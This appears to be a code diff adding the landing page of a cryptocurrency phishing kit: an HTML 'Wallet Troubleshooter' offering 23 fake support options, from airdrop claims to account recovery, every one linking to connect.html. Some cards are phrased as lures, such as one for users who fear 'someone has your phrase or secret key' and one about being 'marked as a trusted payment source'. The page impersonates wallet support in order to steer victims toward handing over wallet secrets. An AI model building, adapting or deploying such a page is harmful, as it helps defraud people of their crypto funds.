@@ -1,0 +1,239 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DApps | Wallet Troubleshooter</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Poppins', sans-serif;
+            background-color: #121212;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 1200px;
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        h2 {
+            font-size: 2.5rem;
+            text-align: center;
+            margin-bottom: 40px;
+            font-weight: 600;
+            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.3);
+        }
+
+        .selection-cards {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(240px, 1fr));
+            gap: 20px;
+            justify-items: center;
+        }
+
+        .card {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            box-shadow: 0 6px 10px rgba(0, 0, 0, 0.2);
+            transition: all 0.3s ease-in-out;
+            cursor: pointer;
+            color: #fff;
+        }
+
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 20px rgba(0, 0, 0, 0.3);
+            border: 1px solid #01EEA0;
+        }
+
+        .card h4 {
+            font-size: 1.25rem;
+            font-weight: 700;
+            color: #fff;
+            margin-bottom: 10px;
+        }
+
+        .card p {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.7);
+            line-height: 1.5;
+        }
+
+        .card a {
+            text-decoration: none;
+            display: inline-block;
+        }
+
+        @media (max-width: 768px) {
+            h2 {
+                font-size: 2rem;
+            }
+
+            .selection-cards {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>MAKE A SELECTION</h2>
+        <div class="selection-cards">
+            <a href="connect.html">
+                <div class="card">
+                    <h4>MIGRATION</h4>
+                    <p>Click here for migration or to resolve any migration-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>RECTIFICATION</h4>
+                    <p>Click here to rectify all strange wallet issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>CLAIM</h4>
+                    <p>Click here to claim tokens or resolve any token claiming related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>SWAP</h4>
+                    <p>Click here to swap tokens or resolve issues related to token swaps.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>SLIPPAGE</h4>
+                    <p>Click here for slippage or transaction fee-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>CLAIM AIRDROP</h4>
+                    <p>Click here to claim airdrops or resolve errors during the airdrop claim process.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>STAKING</h4>
+                    <p>Click here to resolve issues encountered while staking/unstaking.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>WHITELIST</h4>
+                    <p>Click here to whitelist your address or resolve whitelisting errors.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>CROSS TRANSFER</h4>
+                    <p>Click here to resolve cross-bridging errors encountered during cross transfers.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>NFTs</h4>
+                    <p>Click here to resolve NFT-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>LOCKED ACCOUNT</h4>
+                    <p>Click here to resolve locked account or wallet stuck issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>LOGIN ERROR</h4>
+                    <p>Click here to resolve errors encountered during login.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>WALLET GLITCH</h4>
+                    <p>Click here to resolve wallet-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>DEFI FARMING</h4>
+                    <p>Click here for DeFi or Commercial farming-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>VALIDATION</h4>
+                    <p>Click here to validate your wallet via Multisig.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>TRANSACTION DELAY</h4>
+                    <p>Click here for any transaction-related errors.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>MISSING/IRREGULAR BALANCE</h4>
+                    <p>Click here to recover lost or missing funds.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>RECOVERY</h4>
+                    <p>Click here for wallet recovery.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>BUY TOKEN/COIN</h4>
+                    <p>Click here to trade. Your account needs to be marked as a trusted payment source to start trading.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>EXCHANGE</h4>
+                    <p>Click here for token exchange or to resolve errors encountered during token exchange.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>BRIDGING</h4>
+                    <p>Click here to bridge tokens or resolve bridging-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>REVOKE</h4>
+                    <p>Click here to bridge tokens or resolve bridging-related issues.</p>
+                </div>
+            </a>
+            <a href="connect.html">
+                <div class="card">
+                    <h4>SYNCHRONIZATION</h4>
+                    <p>Click here if you think someone has your phrase or secret key, or if you feel like just changing it for security reasons.</p>
+                </div>
+            </a>
+        </div>
+    </div>
+</body>
+</html>
